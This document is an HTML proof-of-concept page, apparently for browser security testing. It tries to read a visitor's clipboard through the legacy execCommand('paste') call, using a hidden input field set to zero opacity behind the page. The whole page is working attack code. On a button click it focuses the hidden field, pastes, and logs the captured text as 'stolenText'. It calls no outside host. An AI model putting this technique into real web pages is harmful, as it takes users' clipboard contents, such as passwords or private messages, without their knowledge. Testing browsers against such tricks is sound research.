<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Legacy Clipboard Read PoC</title>
    <style>
        body { font-family: monospace; padding: 20px; }
        #log { margin-top: 20px; padding-top: 10px; border-top: 1px dashed #000; line-height: 1.5; }
        button { padding: 10px; font-weight: bold; cursor: pointer; }
        #trap { opacity: 0; position: absolute; z-index: -1; }
    </style>
</head>
<body>

    <h3>Legacy Clipboard Read (execCommand)</h3>
    <button id="stealBtn">
        run poc
    </button>
    
    <input type="text" id="trap">
    
    <div id="log">
        > Ready to test...<br>
    </div>

    <script>
        const btn = document.getElementById("stealBtn");
        const logDiv = document.getElementById("log");
        const trap = document.getElementById("trap");

        function printLog(msg) {
            logDiv.innerHTML += `> ${msg}<br>`;
        }

        btn.addEventListener("click", (e) => {
            printLog(`Attempting legacy read... (isTrusted: ${e.isTrusted})`);
            
            trap.focus();
            
            try {
                const success = document.execCommand('paste');
                
                if (success) {
                    const stolenText = trap.value;
                    printLog(`SUCCESS: Data retrieved!`);
                    printLog(`CONTENT: "${stolenText}"`);
                } else {
                    printLog(`BLOCKED: execCommand returned false.`);
                }
            } catch (err) {
                printLog(`ERROR: ${err.name} - ${err.message}`);
            }
        });
    </script>
</body>
</html>
